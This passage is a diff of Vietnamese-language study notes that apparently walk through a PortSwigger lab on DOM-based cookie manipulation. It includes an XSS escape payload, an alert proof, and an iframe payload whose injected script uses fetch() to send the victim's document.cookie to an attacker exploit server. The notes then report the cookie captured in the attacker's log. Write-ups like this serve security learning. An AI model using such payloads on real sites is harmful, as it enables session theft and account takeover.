@@ -356,7 +356,32 @@ and using payload below to steal cookie
 ```
 
 
-- [ ] **27/4** — DOM-based cookie manipulation
+### DOM-based cookie manipulation
+![alt text](image-32.png)
+Ta có thể xác định đc source và dùng payload sau để escapse 
+```code
+1&'>tungdeptrai 
+```
+![alt text](image-33.png)
+Như vậy đã escape thành công 
+![alt text](image-34.png)
+Như kết 1 điều tất yếu alert thành công với 
+```code
+1&%27><script>alert(1)</script>
+```
+![alt text](image-35.png)
+Sau đó window.location sẽ lưu toàn bộ url ; khi user load lại trang thì DOM Store sẽ thực hiện ; và lấy đc cookie 
+
+Sử dụng payload như sau 
+
+```code
+<iframe src="https://0ab400260450e1bf80033fa300b1004b.web-security-academy.net/product?productId=1&'><script>fetch('https://exploit-0a7e009604c8e1df802d3eb801dc0076.exploit-server.net/log?c='%2bdocument.cookie)</script>" onload="if(!window.x)this.src='https://0ab400260450e1bf80033fa300b1004b.web-security-academy.net/';window.x=1;">
+</iframe>
+```
+
+![alt text](image-36.png)
+
+Log từ server của attker khi user reload lại trang product=1  => lấy được cookie 
 
 ---
 
